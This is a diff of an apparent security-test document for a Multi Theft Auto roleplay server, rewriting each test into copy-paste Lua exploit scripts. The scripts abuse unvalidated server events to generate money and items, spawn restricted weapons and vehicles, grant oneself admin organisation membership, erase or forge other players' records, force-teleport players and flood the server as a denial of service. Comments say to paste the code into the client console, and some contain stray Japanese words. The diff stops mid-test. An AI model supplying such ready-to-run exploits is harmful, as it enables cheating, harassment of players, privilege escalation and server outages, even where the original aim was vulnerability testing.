@@ -73,74 +73,121 @@ triggerServerEvent("ev", resourceRoot, "takeMoney", localPlayer, money)
 #### Test 1: Gang Shop Price Manipulation
 ```lua
 -- Exploit: Purchase expensive items for $1
-function exploitGangShop()
-    local originalPrice = items[1][2]  -- Get item price
-    items[1][2] = 1                     -- Change to $1
-    triggerServerEvent("evEwenciks_35hjdhgkhf", resourceRoot, "buyItem", localPlayer, items[1][1], 1, getElementData(localPlayer, "player:sid"))
-    items[1][2] = originalPrice         -- Restore price
-end
--- Expected: Player buys expensive item for $1
--- Impact: Economy destruction
+-- Copy this code to client console or create a .lua file
+-- Run in-game to buy items at manipulated prices
+
+-- Direct purchase with modified price (bypassing client validation)
+triggerServerEvent("evEwenciks_35hjdhgkhf", resourceRoot, "buyItem", localPlayer, "Maska", 1, 12345)
+-- Item: "Maska" (Mask), Price: 1 PLN (instead of normal 50000 PLN), PlayerID: 12345
+
+-- Buy multiple expensive items for $1 each
+triggerServerEvent("evEwenciks_35hjdhgkhf", resourceRoot, "buyItem", localPlayer, "Kamizelka kuloodporna", 1, 12345)
+triggerServerEvent("evEwenciks_35hjdhgkhf", resourceRoot, "buyItem", localPlayer, "Plecak", 1, 12345)
+triggerServerEvent("evEwenciks_35hjdhgkhf", resourceRoot, "buyItem", localPlayer, "Rękawiczki", 1, 12345)
+
+-- Expected: Player buys expensive items for $1 each
+-- Impact: Economy destruction, unlimited items
 ```
 
 #### Test 2: Faction Payment Multiplication
 ```lua
 -- Exploit: Multiply salary by 1000x
-function exploitFactionPayment()
-    local pension_table = {
-        [1] = 5550000,  -- Modified from 5550 to 5550000
-        [2] = 5800000,
-        -- ... etc
-    }
-    triggerServerEvent("evEwenciks_l867gsf", resourceRoot, "paymentFaction", 
-        localPlayer, 
-        getElementData(localPlayer, "player:sid"), 
-        getElementData(localPlayer, "player:faction"), 
-        pension_table[1] * 999 * 1.3)
-end
--- Expected: Player receives 1000x salary
--- Impact: Instant wealth gain
+-- Run this to receive massive faction payment
+
+-- Normal payment would be around 7200 PLN
+-- This exploit pays 7,200,000 PLN instead
+triggerServerEvent("evEwenciks_l867gsf", resourceRoot, "paymentFaction", 
+    localPlayer, 
+    12345,      -- Your player SID
+    "SAPD",     -- Faction name
+    7200000)    -- Payment amount (1000x normal)
+
+-- Test with even larger amount
+triggerServerEvent("evEwenciks_l867gsf", resourceRoot, "paymentFaction", 
+    localPlayer, 
+    12345,
+    "SAFD", 
+    99999999)   -- $99,999,999 payment
+
+-- Expected: Player receives massive salary payment
+-- Impact: Instant millionaire, economy破壊
 ```
 
 #### Test 3: Jewelry Heist Money Injection
 ```lua
--- Exploit: Modify heist reward amount
-function exploitJewelryHeist()
-    local fake_table_players = {}
-    for i=1, 100 do
-        table.insert(fake_table_players, {money = 999999999})
-    end
-    triggerServerEvent("ev", resourceRoot, "addMoney", localPlayer, 
-        getElementData(localPlayer, "player:organization"), 
-        fake_table_players)
+-- Exploit: Inject massive amounts of money through heist event
+-- This bypasses heist mechanics and adds money directly
+
+-- Create fake heist completion data
+triggerServerEvent("ev", resourceRoot, "addMoney", localPlayer, "MAFIA", {
+    {money = 5000000},
+    {money = 5000000},
+    {money = 5000000},
+    {money = 5000000},
+    {money = 5000000}
+})
+
+-- Inject to personal account
+triggerServerEvent("ev", resourceRoot, "addMoney", localPlayer, "", {
+    {money = 99999999}
+})
+
+-- Mass injection with 100 fake bags
+local moneyBags = {}
+for i=1, 100 do
+    moneyBags[i] = {money = 999999}
 end
+triggerServerEvent("ev", resourceRoot, "addMoney", localPlayer, "CARTEL", moneyBags)
+
 -- Expected: Massive money injection into player/organization
--- Impact: Complete economy破壊
+-- Impact: Complete economy破壊, $100M+ generated
 ```
 
 #### Test 4: Negative Money Withdrawal
 ```lua
--- Exploit: Use negative values to add money
-function exploitNegativeMoney()
-    local negative_amount = -1000000
-    triggerServerEvent("ev", resourceRoot, "takeMoney", localPlayer, negative_amount)
+-- Exploit: Use negative values to add money instead of removing it
+-- If server doesn't validate negative numbers, this adds money
+
+-- Try to "take" negative money (actually adds money)
+triggerServerEvent("ev", resourceRoot, "takeMoney", localPlayer, -5000000)
+
+-- Speed camera fine exploit (pay negative fine = get money)
+triggerServerEvent("ev", resourceRoot, "takeMoney", localPlayer, -999999)
+
+-- Multiple negative withdrawals
+for i=1, 10 do
+    triggerServerEvent("ev", resourceRoot, "takeMoney", localPlayer, -100000)
 end
+
 -- Expected: Instead of taking money, adds money to account
--- Impact: Infinite money generation
+-- Impact: Infinite money generation, +$1M per execution
 ```
 
 #### Test 5: Rapid-Fire Purchase Exploit
 ```lua
--- Exploit: Bypass cooldown and purchase repeatedly
-function exploitRapidPurchase()
-    for i=1, 1000 do
+-- Exploit: Bypass cooldown timer and spam purchases
+-- Client-side cooldown can be bypassed
+
+-- Spam purchase 1000 items instantly
+for i=1, 1000 do
+    triggerServerEvent("evEwenciks_35hjdhgkhf", resourceRoot, "buyItem", 
+        localPlayer, 
+        "Maska",    -- Item name
+        0,          -- Price: $0
+        12345)      -- Your player SID
+end
+
+-- Purchase different items rapidly
+local items = {"Maska", "Plecak", "Kamizelka kuloodporna", "Rękawiczki", "Bandaż"}
+for i=1, 200 do
+    for _, itemName in ipairs(items) do
         triggerServerEvent("evEwenciks_35hjdhgkhf", resourceRoot, "buyItem", 
-            localPlayer, "Expensive Item", 0, 
-            getElementData(localPlayer, "player:sid"))
+            localPlayer, itemName, 0, 12345)
     end
 end
--- Expected: 1000 free items obtained
--- Impact: Item flooding and potential server lag
+
+-- Expected: 1000+ free items obtained in seconds
+-- Impact: Item flooding, database overflow, server lag
 ```
 
 ---
@@ -199,68 +246,144 @@ triggerServerEvent("evEwenciks_lgdfnrj", resourceRoot, "moneyTree", localPlayer)
 
 #### Test 1: Free Fire Extinguisher Spam
 ```lua
--- Exploit: Obtain unlimited fire extinguishers
-function exploitFreeExtinguishers()
-    for i=1, 100 do
-        triggerServerEvent("evEwenciks_lgdfnrj", resourceRoot, "giveItems", localPlayer, "gasnica")
-    end
+-- Exploit: Obtain unlimited SAFD equipment without being in faction
+-- Copy and paste directly into console or script file
+
+-- Get 100 fire extinguishers
+for i=1, 100 do
+    triggerServerEvent("evEwenciks_lgdfnrj", resourceRoot, "giveItems", localPlayer, "gasnica")
 end
--- Expected: 100 fire extinguishers in inventory
+
+-- Get multiple SAFD items
+triggerServerEvent("evEwenciks_lgdfnrj", resourceRoot, "giveItems", localPlayer, "gasnica")
+triggerServerEvent("evEwenciks_lgdfnrj", resourceRoot, "giveItems", localPlayer, "pila", true)
+triggerServerEvent("evEwenciks_lgdfnrj", resourceRoot, "giveItems", localPlayer, "skokochron")
+triggerServerEvent("evEwenciks_lgdfnrj", resourceRoot, "giveItems", localPlayer, "rozpierak")
+triggerServerEvent("evEwenciks_lgdfnrj", resourceRoot, "giveItems", localPlayer, "hooligan")
+triggerServerEvent("evEwenciks_lgdfnrj", resourceRoot, "giveItems", localPlayer, "waz", true)
+triggerServerEvent("evEwenciks_lgdfnrj", resourceRoot, "giveItems", localPlayer, "Wiadro z sorbentem", true)
+
+-- Expected: 100+ faction items in inventory as civilian
 -- Impact: Item economy破壊, inventory overflow
 ```
 
 #### Test 2: Steal Confiscated Police Weapons
 ```lua
--- Exploit: Get all confiscated weapons without being police
-function exploitPoliceWeapons()
-    local weapons = {"M4", "AK47", "Sniper Rifle", "RPG", "Combat Shotgun"}
-    for _, weapon in ipairs(weapons) do
-        triggerServerEvent("ev", resourceRoot, "giveWeapon", localPlayer, weapon)
-    end
+-- Exploit: Get confiscated weapons without being SAPD officer
+-- These are high-tier weapons normally restricted to police evidence locker
+
+-- Get individual weapons
+triggerServerEvent("ev", resourceRoot, "giveWeapon", localPlayer, "M4")
+triggerServerEvent("ev", resourceRoot, "giveWeapon", localPlayer, "AK-47")
+triggerServerEvent("ev", resourceRoot, "giveWeapon", localPlayer, "Sniper Rifle")
+triggerServerEvent("ev", resourceRoot, "giveWeapon", localPlayer, "RPG")
+triggerServerEvent("ev", resourceRoot, "giveWeapon", localPlayer, "Combat Shotgun")
+triggerServerEvent("ev", resourceRoot, "giveWeapon", localPlayer, "Desert Eagle")
+triggerServerEvent("ev", resourceRoot, "giveWeapon", localPlayer, "MP5")
+
+-- Get full arsenal
+local weapons = {"M4", "AK-47", "Sniper Rifle", "RPG", "Combat Shotgun", "Desert Eagle", "MP5", "Shotgun", "Rifle"}
+for _, weapon in ipairs(weapons) do
+    triggerServerEvent("ev", resourceRoot, "giveWeapon", localPlayer, weapon)
 end
--- Expected: Civilian player gets police weapons
--- Impact: Game balance破壊, unfair advantage
+
+-- Expected: Civilian player gets police-grade weapons
+-- Impact: Game balance破壊, unfair PvP advantage
 ```
 
 #### Test 3: Faction Armor Duplication
 ```lua
 -- Exploit: Get unlimited armor without faction membership
-function exploitArmorDuplication()
-    for i=1, 50 do
-        triggerServerEvent("evEwenciks_k54ghbg", resourceRoot, "giveArmor", localPlayer)
-    end
+-- Armor normally restricted to SAPD/SAFD/military factions
+
+-- Get armor 50 times (max armor is 100, but this may create inventory items)
+for i=1, 50 do
+    triggerServerEvent("evEwenciks_k54ghbg", resourceRoot, "giveArmor", localPlayer)
 end
--- Expected: Armor maxed out repeatedly (possible duplication)
--- Impact: Invulnerability exploit
+
+-- Get armor + weapons combo
+triggerServerEvent("evEwenciks_k54ghbg", resourceRoot, "giveArmor", localPlayer)
+triggerServerEvent("evEwenciks_k54ghbg", resourceRoot, "giveWeapons", localPlayer, "M4")
+triggerServerEvent("evEwenciks_k54ghbg", resourceRoot, "giveWeapons", localPlayer, "Desert Eagle")
+triggerServerEvent("evEwenciks_k54ghbg", resourceRoot, "giveWeapons", localPlayer, "Combat Shotgun")
+
+-- Rapid armor refresh
+for i=1, 100 do
+    triggerServerEvent("evEwenciks_k54ghbg", resourceRoot, "giveArmor", localPlayer)
+end
+
+-- Expected: Armor maxed out repeatedly, possible inventory duplication
+-- Impact: Invulnerability exploit in combat
 ```
 
 #### Test 4: Spawn Faction Vehicles as Civilian
 ```lua
--- Exploit: Spawn police/fire vehicles without being in faction
-function exploitFactionVehicles()
-    local vehicle_models = {523, 596, 597, 598, 599, 601}  -- Police vehicles
-    for _, model in ipairs(vehicle_models) do
-        triggerServerEvent("evEwenciks_43hgdfdfg", resourceRoot, "createVehicle", 
-            localPlayer, model, "SAPD", 0, 0, {}, {x=0, y=0, z=10}, {}, false, false)
-    end
+-- Exploit: Spawn police/fire/military vehicles without faction membership
+-- Vehicle IDs: 523=HPV1000, 596=Police Car, 597=Police Car, 598=Police Car, 599=Police Ranger, 601=SWAT Tank
+
+-- Spawn single police vehicle at your location
+local x, y, z = getElementPosition(localPlayer)
+triggerServerEvent("evEwenciks_43hgdfdfg", resourceRoot, "createVehicle", 
+    localPlayer,        -- Player
+    596,               -- Model: Police Car (LSPD)
+    "SAPD",           -- Faction
+    0,                -- Color 1
+    0,                -- Color 2
+    {},               -- Upgrades
+    {x=x, y=y, z=z+2}, -- Position
+    {},               -- Extra data
+    false,            -- Custom
+    false)            -- Extra flag
+
+-- Spawn multiple faction vehicles
+local x, y, z = getElementPosition(localPlayer)
+local vehicles = {
+    {model=596, faction="SAPD", name="Police Car"},
+    {model=597, faction="SAPD", name="Police Car SF"},
+    {model=598, faction="SAPD", name="Police Car LV"},
+    {model=599, faction="SAPD", name="Police Ranger"},
+    {model=601, faction="SAPD", name="SWAT Tank"},
+    {model=407, faction="SAFD", name="Fire Truck"},
+    {model=416, faction="SAFD", name="Ambulance"}
+}
+
+for i, veh in ipairs(vehicles) do
+    triggerServerEvent("evEwenciks_43hgdfdfg", resourceRoot, "createVehicle", 
+        localPlayer, veh.model, veh.faction, 0, 0, {}, 
+        {x=x+i*5, y=y, z=z+2}, {}, false, false)
 end
--- Expected: Civilian spawns 6 police vehicles
--- Impact: Faction restrictions bypassed
+
+-- Expected: Civilian spawns 7+ faction vehicles
+-- Impact: Faction restrictions bypassed, vehicle spam
 ```
 
 #### Test 5: Equipment Bag Overflow
 ```lua
--- Exploit: Fill inventory with high-value faction items
-function exploitEquipmentFlood()
-    local items = {"pila", "rozpierak", "hooligan", "Wiadro z sorbentem", "waz", "skokochron"}
-    for i=1, 1000 do
-        for _, item in ipairs(items) do
-            triggerServerEvent("evEwenciks_lgdfnrj", resourceRoot, "giveItems", localPlayer, item, true)
-        end
+-- Exploit: Fill inventory with thousands of high-value faction items
+-- This can crash client, corrupt database, or cause server lag
+
+-- Spam all SAFD equipment items
+local items = {"pila", "rozpierak", "hooligan", "Wiadro z sorbentem", "waz", "skokochron", "gasnica"}
+
+-- Flood inventory with 10,000+ items
+for i=1, 10000 do
+    for _, item in ipairs(items) do
+        triggerServerEvent("evEwenciks_lgdfnrj", resourceRoot, "giveItems", localPlayer, item, true)
     end
 end
--- Expected: Thousands of faction items obtained
--- Impact: Database overflow, server lag, economy破壊
+
+-- Rapid-fire single item spam
+for i=1, 5000 do
+    triggerServerEvent("evEwenciks_lgdfnrj", resourceRoot, "giveItems", localPlayer, "gasnica")
+end
+
+-- Money tree spam (if it gives money/items)
+for i=1, 1000 do
+    triggerServerEvent("evEwenciks_lgdfnrj", resourceRoot, "moneyTree", localPlayer)
+end
+
+-- Expected: 70,000+ faction items obtained
+-- Impact: Database overflow, server crash, economy破壊, client crash
 ```
 
 ---
@@ -320,85 +443,189 @@ triggerServerEvent("ev", resourceRoot, "startAFKplayer", localPlayer, false)
 
 #### Test 1: Teleport Other Players to Vehicle
 ```lua
--- Exploit: Force any player into your vehicle
-function exploitForcePlayerToVehicle()
-    local targetPlayer = getPlayerFromName("VictimPlayer")
-    local myVehicle = getPedOccupiedVehicle(localPlayer)
-    
-    if targetPlayer and myVehicle then
-        triggerServerEvent("ev", resourceRoot, "warpPlayerVehicle", 
-            localPlayer, targetPlayer, myVehicle, true)
+-- Exploit: Force any player into your vehicle (kidnapping)
+-- Get victim's player element first
+
+-- Method 1: By player name
+local targetPlayer = getPlayerFromName("JohnDoe")  -- Replace with actual player name
+local myVehicle = getPedOccupiedVehicle(localPlayer)
+
+if targetPlayer and myVehicle then
+    triggerServerEvent("ev", resourceRoot, "warpPlayerVehicle", 
+        localPlayer, targetPlayer, myVehicle, true)
+end
+
+-- Method 2: Kidnap all nearby players
+local x, y, z = getElementPosition(localPlayer)
+local nearbyPlayers = getElementsWithinRange(x, y, z, 50, "player")
+local myVehicle = getPedOccupiedVehicle(localPlayer)
+
+if myVehicle then
+    for _, player in ipairs(nearbyPlayers) do
+        if player ~= localPlayer then
+            triggerServerEvent("ev", resourceRoot, "warpPlayerVehicle", 
+                localPlayer, player, myVehicle, true)
+        end
     end
 end
--- Expected: Target player teleported into attacker's vehicle
--- Impact: Kidnapping, griefing, moving players against their will
+
+-- Method 3: Teleport specific player to specific vehicle
+local victim = getPlayerFromName("VictimName")
+local anyVehicle = getElementByID("vehicle_123")  -- Or use getVehicleByID if available
+triggerServerEvent("ev", resourceRoot, "warpPlayerVehicle", 
+    localPlayer, victim, anyVehicle, true)
+
+-- Expected: Target players teleported into attacker's vehicle
+-- Impact: Kidnapping, griefing, moving players against will
 ```
 
 #### Test 2: Instant Race Completion
 ```lua
 -- Exploit: Win race immediately without driving
-function exploitInstantWinRace()
-    -- Trigger race start
-    addEventHandler("drift:zacznijliczyc", root, function()
-        -- Immediately trigger race end
-        wait(100)  -- Wait 100ms
-        triggerServerEvent("ev", resourceRoot, "endRace", localPlayer)
-    end)
+-- Just trigger race end right after start
+
+-- Instant win race
+triggerServerEvent("ev", resourceRoot, "endRace", localPlayer)
+
+-- Instant complete labyrinth/maze event
+triggerServerEvent("ev", resourceRoot, "zakoczenieLabiryntu", localPlayer)
+
+-- Complete multiple events instantly
+for i=1, 10 do
+    triggerServerEvent("ev", resourceRoot, "endRace", localPlayer)
+    triggerServerEvent("ev", resourceRoot, "zakoczenieLabiryntu", localPlayer)
 end
--- Expected: Win race in 0.1 seconds
--- Impact: Unfair competition, prize farming
+
+-- Remove event vehicles instantly (cleanup)
+triggerServerEvent("ev", resourceRoot, "removePedVehicle", localPlayer, true)
+triggerServerEvent("ev", resourceRoot, "removePedVehicle", localPlayer, false)
+
+-- Expected: Win race/events in 0 seconds, collect rewards repeatedly
+-- Impact: Unfair competition, prize farming, leaderboard manipulation
 ```
 
 #### Test 3: Vehicle Spawn Position Abuse
 ```lua
--- Exploit: Spawn vehicle inside secure areas
-function exploitVehicleSpawnPosition()
-    local restricted_positions = {
-        {x=2264, y=2477, z=-5},     -- Inside police vault
-        {x=1000, y=1000, z=1000},   -- Sky spawn
-        {x=0, y=0, z=-100}          -- Underground spawn
-    }
-    
-    for _, pos in ipairs(restricted_positions) do
-        triggerServerEvent("ev", resourceRoot, "spawnVeh", 
-            localPlayer, 411, 0, pos)  -- Spawn Infernus
-    end
+-- Exploit: Spawn vehicles in restricted/impossible locations
+-- Client controls spawn position completely
+
+-- Spawn inside police vault (steal evidence area coordinates)
+triggerServerEvent("ev", resourceRoot, "spawnVeh", 
+    localPlayer,           -- Player
+    411,                  -- Vehicle model (Infernus - expensive car)
+    0,                    -- Price (free)
+    {x=2264, y=2477, z=-5}) -- Position: inside police station vault
+
+-- Spawn in sky (flying spawn)
+triggerServerEvent("ev", resourceRoot, "spawnVeh", 
+    localPlayer, 411, 0, {x=0, y=0, z=1000})
+
+-- Spawn underground
+triggerServerEvent("ev", resourceRoot, "spawnVeh", 
+    localPlayer, 411, 0, {x=0, y=0, z=-100})
+
+-- Spawn inside restricted military base
+triggerServerEvent("ev", resourceRoot, "spawnVeh", 
+    localPlayer, 520, 0, {x=214, y=1875, z=17})  -- Hydra jet at Area 69
+
+-- Spawn multiple vehicles at impossible locations
+local locations = {
+    {x=2264, y=2477, z=-5, name="Police Vault"},
+    {x=0, y=0, z=2000, name="Sky"},
+    {x=-2655, y=632, z=100, name="Hospital Roof"},
+    {x=1544, y=-1353, z=500, name="Above city"}
+}
+
+for _, loc in ipairs(locations) do
+    triggerServerEvent("ev", resourceRoot, "spawnVeh", 
+        localPlayer, 411, 0, {x=loc.x, y=loc.y, z=loc.z})
 end
+
 -- Expected: Vehicles spawn in impossible/restricted locations
--- Impact: Base infiltration, griefing, stuck vehicles
+-- Impact: Base infiltration, griefing, stuck vehicles, server cleanup issues
 ```
 
 #### Test 4: AFK Immunity Exploit
 ```lua
--- Exploit: Toggle AFK to avoid damage/cops
-function exploitAFKImmunity()
-    -- When in danger, activate AFK
-    addEventHandler("onClientPlayerDamage", localPlayer, function()
-        triggerServerEvent("ev", resourceRoot, "startAFKplayer", localPlayer, true)
-    end)
-    
-    -- After danger passes, deactivate
-    setTimer(function()
-        triggerServerEvent("ev", resourceRoot, "startAFKplayer", localPlayer, false)
-    end, 5000, 1)
+-- Exploit: Toggle AFK status to gain immunity/avoid cops/escape combat
+
+-- Instant AFK activation (become immune)
+triggerServerEvent("ev", resourceRoot, "startAFKplayer", localPlayer, true)
+
+-- Instant AFK deactivation (re-enable movement)
+triggerServerEvent("ev", resourceRoot, "startAFKplayer", localPlayer, false)
+
+-- Rapid toggle (confuse system)
+for i=1, 100 do
+    triggerServerEvent("ev", resourceRoot, "startAFKplayer", localPlayer, true)
+    triggerServerEvent("ev", resourceRoot, "startAFKplayer", localPlayer, false)
 end
--- Expected: Player becomes immune while "AFK"
--- Impact: Combat logging, punishment evasion
+
+-- Combat AFK exploit: activate when taking damage
+bindKey("mouse1", "down", function()
+    -- When someone shoots at you, go AFK to avoid damage
+    local myHealth = getElementHealth(localPlayer)
+    if myHealth < 50 then
+        triggerServerEvent("ev", resourceRoot, "startAFKplayer", localPlayer, true)
+        setTimer(function()
+            triggerServerEvent("ev", resourceRoot, "startAFKplayer", localPlayer, false)
+        end, 10000, 1)  -- Stay AFK for 10 seconds
+    end
+end)
+
+-- Police chase AFK exploit
+local hasWantedLevel = getPlayerWantedLevel(localPlayer) > 0
+if hasWantedLevel then
+    triggerServerEvent("ev", resourceRoot, "startAFKplayer", localPlayer, true)
+end
+
+-- Expected: Player becomes immune/untouchable while "AFK"
+-- Impact: Combat logging, punishment evasion, wanted level escape
 ```
 
 #### Test 5: Mass Player Synchronization Disruption
 ```lua
--- Exploit: Cause sync issues by spamming synchro events
-function exploitSyncDisruption()
-    local allPlayers = getElementsByType("player")
-    for i=1, 1000 do
-        for _, player in ipairs(allPlayers) do
-            triggerServerEvent("ev", resourceRoot, "synchro", localPlayer, player)
-        end
+-- Exploit: Cause server lag/crash by spamming sync events
+-- This is a DoS attack vector
+
+-- Get all players on server
+local allPlayers = getElementsByType("player")
+
+-- Flood server with sync requests
+for i=1, 10000 do
+    for _, player in ipairs(allPlayers) do
+        triggerServerEvent("ev", resourceRoot, "synchro", localPlayer, player)
     end
 end
--- Expected: Server becomes unresponsive due to sync flood
--- Impact: DoS attack, server crash, player experience破壊
+
+-- Continuous sync spam
+setTimer(function()
+    local players = getElementsByType("player")
+    for _, player in ipairs(players) do
+        triggerServerEvent("ev", resourceRoot, "synchro", localPlayer, player)
+    end
+end, 50, 0)  -- Every 50ms forever
+
+-- Targeted player sync disruption
+local victim = getPlayerFromName("TargetPlayer")
+for i=1, 50000 do
+    triggerServerEvent("ev", resourceRoot, "synchro", localPlayer, victim)
+end
+
+-- Warp spam (try to warp player repeatedly)
+local victim = getPlayerFromName("VictimPlayer")
+local vehicles = getElementsByType("vehicle")
+for i=1, 1000 do
+    for _, veh in ipairs(vehicles) do
+        triggerServerEvent("ev", resourceRoot, "warpPlayerVehicle", 
+            localPlayer, victim, veh, true)
+        triggerServerEvent("ev", resourceRoot, "warpPlayerVehicle", 
+            localPlayer, victim, veh, false)
+    end
+end
+
+-- Expected: Server becomes unresponsive, massive lag, possible crash
+-- Impact: DoS attack, server crash, player experience破壊, database corruption
 ```
 
 ---
@@ -456,99 +683,208 @@ triggerServerEvent("evEwenciks_l867gsf", resourceRoot, "startDUTY", localPlayer,
 
 #### Test 1: Unauthorized Organization Addition
 ```lua
--- Exploit: Add self to admin organization
-function exploitAddToAdminOrg()
-    local my_uid = getElementData(localPlayer, "player:sid")
-    local admin_orgs = {"ADMIN", "MODERATOR", "OWNER", "DEVELOPER"}
-    
-    for _, org in ipairs(admin_orgs) do
-        triggerServerEvent("evEwenciks_iuydfgb", resourceRoot, 
-            "addUserOrganization", my_uid, org)
-    end
+-- Exploit: Add yourself to admin/moderator organizations
+-- Get your player SID first (usually stored in element data)
+
+-- Add self to admin organization
+local my_sid = 12345  -- Replace with your actual player SID (or use getElementData(localPlayer, "player:sid"))
+triggerServerEvent("evEwenciks_iuydfgb", resourceRoot, "addUserOrganization", my_sid, "ADMIN")
+
+-- Add to multiple admin organizations
+local admin_organizations = {"ADMIN", "MODERATOR", "OWNER", "DEVELOPER", "HELPER", "SUPPORT"}
+for _, org_name in ipairs(admin_organizations) do
+    triggerServerEvent("evEwenciks_iuydfgb", resourceRoot, "addUserOrganization", my_sid, org_name)
 end
--- Expected: Player gains admin/moderator privileges
--- Impact: Complete server takeover, ban evasion
+
+-- Add another player to admin
+local target_sid = 67890
+triggerServerEvent("evEwenciks_iuydfgb", resourceRoot, "addUserOrganization", target_sid, "ADMIN")
+
+-- Add to faction organizations (gangs, police, etc)
+local faction_orgs = {"SAPD", "SAFD", "MAFIA", "CARTEL", "YAKUZA", "BIKERS"}
+for _, org_name in ipairs(faction_orgs) do
+    triggerServerEvent("evEwenciks_iuydfgb", resourceRoot, "addUserOrganization", my_sid, org_name)
+end
+
+-- Expected: Player gains admin/moderator privileges across server
+-- Impact: Complete server takeover, ban evasion, god mode access
 ```
 
 #### Test 2: Mass Weapon License Granting
 ```lua
--- Exploit: Give everyone weapon licenses
-function exploitMassLicenseGrant()
-    local allPlayers = getElementsByType("player")
-    for _, player in ipairs(allPlayers) do
-        local player_id = getElementData(player, "player:id")
-        local player_name = getPlayerName(player)
-        triggerServerEvent("ev", resourceRoot, "licencjaBron", 
-            localPlayer, player_id, player_name, "Free license from hacker", "licencja", true)
-    end
+-- Exploit: Grant weapon licenses to everyone on server (or specific players)
+
+-- Grant license to self
+local my_id = 12345
+local my_name = "HackerPlayer"
+triggerServerEvent("ev", resourceRoot, "licencjaBron", 
+    localPlayer, my_id, my_name, "Self-issued license", "licencja", true)
+
+-- Grant licenses to all online players
+local allPlayers = getElementsByType("player")
+for _, player in ipairs(allPlayers) do
+    local player_name = getPlayerName(player)
+    local player_id = math.random(1000, 99999)  -- Fake ID if real ID unavailable
+    triggerServerEvent("ev", resourceRoot, "licencjaBron", 
+        localPlayer, player_id, player_name, "Mass license grant exploit", "licencja", true)
 end
--- Expected: All players get weapon licenses
--- Impact: Server regulations破壊, chaos
+
+-- Grant license to specific player
+triggerServerEvent("ev", resourceRoot, "licencjaBron", 
+    localPlayer, 54321, "TargetPlayerName", "Free weapon license", "licencja", true)
+
+-- Grant multiple licenses (spam)
+for i=1, 100 do
+    triggerServerEvent("ev", resourceRoot, "licencjaBron", 
+        localPlayer, 12345, "HackerPlayer", "License #" .. i, "licencja", true)
+end
+
+-- Expected: All players receive weapon licenses regardless of qualifications
+-- Impact: Server regulations破壊, everyone can carry weapons legally
 ```
 
 #### Test 3: Criminal Record Erasure
 ```lua
--- Exploit: Delete all criminal records for self or others
-function exploitRecordErasure()
-    local target_id = getElementData(localPlayer, "player:id")
-    local target_name = getPlayerName(localPlayer)
-    
-    local record_types = {"notatka", "poszukiwany", "notatka pojazd", "poszukiwany pojazd"}
-    
-    for _, record_type in ipairs(record_types) do
-        triggerServerEvent("ev", resourceRoot, "removeNotes", 
-            localPlayer, target_id, target_name, record_type)
-    end
+-- Exploit: Delete all criminal records and wanted levels
+
+-- Delete your own records (make yourself clean)
+local my_id = 12345
+local my_name = "CriminalPlayer"
+
+-- Remove all note types
+local record_types = {"notatka", "poszukiwany", "notatka pojazd", "poszukiwany pojazd", "licencja"}
+for _, record_type in ipairs(record_types) do
+    triggerServerEvent("ev", resourceRoot, "removeNotes", 
+        localPlayer, my_id, my_name, record_type)
 end
--- Expected: All criminal history deleted
--- Impact: Evidence tampering, criminal protection
+
+-- Spam delete to ensure all records removed
+for i=1, 50 do
+    triggerServerEvent("ev", resourceRoot, "removeNotes", localPlayer, my_id, my_name, "notatka")
+    triggerServerEvent("ev", resourceRoot, "removeNotes", localPlayer, my_id, my_name, "poszukiwany")
+end
+
+-- Delete another player's records
+local victim_id = 67890
+local victim_name = "InnocentCop"
+for _, record_type in ipairs(record_types) do
+    triggerServerEvent("ev", resourceRoot, "removeNotes", 
+        localPlayer, victim_id, victim_name, record_type)
+end
+
+-- Delete vehicle records
+triggerServerEvent("ev", resourceRoot, "removeNotes", localPlayer, my_id, "Infernus - 12345", "notatka pojazd")
+triggerServerEvent("ev", resourceRoot, "removeNotes", localPlayer, my_id, "Infernus - 12345", "poszukiwany pojazd")
+
+-- Expected: All criminal history erased, clean record
+-- Impact: Evidence tampering, criminals go free, police database破壊
 ```
 
 #### Test 4: Fake Police Record Creation
 ```lua
--- Exploit: Frame innocent players with fake records
-function exploitFakeRecords()
-    local victim_id = 12345
-    local victim_name = "InnocentPlayer"
-    
-    local fake_crimes = {
-        "Murder of 50 people",
-        "Bank robbery - $10,000,000 stolen",
-        "Terrorism - bombed city hall",
-        "Drug trafficking - 1000kg cocaine",
-        "Wanted dead or alive - $999,999 bounty"
-    }
-    
-    for _, crime in ipairs(fake_crimes) do
-        triggerServerEvent("ev", resourceRoot, "addNotes", 
-            localPlayer, victim_id, victim_name, crime, "poszukiwany")
-    end
+-- Exploit: Frame innocent players by creating fake criminal records
+
+-- Frame a specific player
+local victim_id = 99999
+local victim_name = "InnocentPlayer"
+
+-- Add wanted status
+triggerServerEvent("ev", resourceRoot, "addNotes", 
+    localPlayer, victim_id, victim_name, 
+    "WANTED: Armed and dangerous - Murder of 50+ civilians", 
+    "poszukiwany")
+
+-- Add multiple fake crimes
+local fake_crimes = {
+    "Murder of 50 people in city center massacre",
+    "Bank robbery - Stole $10,000,000 from central bank",
+    "Terrorism - Bombed city hall and police station",
+    "Drug trafficking - 1000kg cocaine smuggling operation",
+    "Assault on police officers - Killed 10 cops",
+    "MOST WANTED - $999,999 bounty - Shoot on sight",
+    "Serial killer - 100+ victims confirmed",
+    "Cop killer - Extremely dangerous",
+    "Armed robbery gang leader",
+    "Escaped maximum security prison"
+}
+
+for _, crime in ipairs(fake_crimes) do
+    triggerServerEvent("ev", resourceRoot, "addNotes", 
+        localPlayer, victim_id, victim_name, crime, "poszukiwany")
+    triggerServerEvent("ev", resourceRoot, "addNotes", 
+        localPlayer, victim_id, victim_name, crime, "notatka")
 end
--- Expected: Innocent player gets massive wanted level
--- Impact: Harassment, false imprisonment, reputation破壊
+
+-- Frame their vehicles too
+triggerServerEvent("ev", resourceRoot, "addNotesVehicle", 
+    localPlayer, 12345, "Infernus - 12345", 
+    "Stolen vehicle - Used in multiple bank robberies", 
+    "poszukiwany pojazd")
+
+-- Mass frame attack (frame everyone)
+local allPlayers = getElementsByType("player")
+for _, player in ipairs(allPlayers) do
+    local p_name = getPlayerName(player)
+    local p_id = math.random(10000, 99999)
+    triggerServerEvent("ev", resourceRoot, "addNotes", 
+        localPlayer, p_id, p_name, 
+        "Mass wanted exploit - Everyone is now wanted", 
+        "poszukiwany")
+end
+
+-- Expected: Innocent players get huge wanted levels, hunted by police
+-- Impact: Harassment, false imprisonment, reputation破壊, server chaos
 ```
 
 #### Test 5: Faction Rank Escalation
 ```lua
--- Exploit: Start duty with highest rank in any faction
-function exploitFactionRankEscalation()
-    local target_factions = {"SAPD", "SAFD", "ARMY", "GOV"}
-    
-    for _, faction in ipairs(target_factions) do
-        -- Set element data to fake faction membership
-        setElementData(localPlayer, "player:faction", faction)
